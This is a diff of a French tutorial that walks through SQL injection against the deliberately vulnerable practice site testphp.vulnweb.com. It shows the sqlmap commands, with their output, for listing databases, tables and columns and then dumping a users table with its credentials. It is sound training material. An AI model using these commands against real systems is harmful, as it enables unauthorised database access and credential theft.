@@ -10,15 +10,9 @@ C'est un site qui regroupe des artistes par catégorie, avec des descriptions pa
 
 On peut vérifier cette sensibilité en ajoutant un guillemet simple à la fin de l'url, car il retourne une erreur sql.
 
-
-
-## Par injections SQL à la main
-
-
-
 ## À l'aide de SQLMAP
 
-#### 1. On commence par taper la commande suivante pour lister toutes les databases utilisées à cette url :
+#### 1. On commence par taper la commande suivante pour lister toutes les databases utilisées à cette url \(on prend ici une url depuis la page d'un artiste\) :
 
 ```text
 $ sudo sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs 
@@ -40,6 +34,8 @@ available databases [2]:
 ```
 
 On remarque ainsi la présence de 2 databases pour cette url.
+
+
 
 #### 2. À partir de la, on peut récupérer le nom des tables des databases que l'on souhaite, par exemple ici la database acuart, avec la commande :
 
@@ -69,6 +65,8 @@ Database: acuart
 | users     |
 +-----------+
 ```
+
+
 
 #### 3. Notre but étant de pouvoir obtenir les informations des utilisateurs, on va s'intéresser à la table users, et afficher ses attributs :
 
@@ -102,7 +100,9 @@ Table: users
 +---------+--------------+
 ```
 
-Maintenant, il ne nous reste plus qu'à afficher les données de la table :
+
+
+#### 4. Maintenant, il ne nous reste plus qu'à afficher les données de la table :
 
 ```text
 $ sudo sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dump -D acuart -T users
@@ -122,4 +122,8 @@ Table: users
 ```
 
 On peut donc voir que la table users contient un utilisateur dont l'identifiant et le mot de passe sont 'test'.
+
+
+
+## Avec injections SQL à la main
 
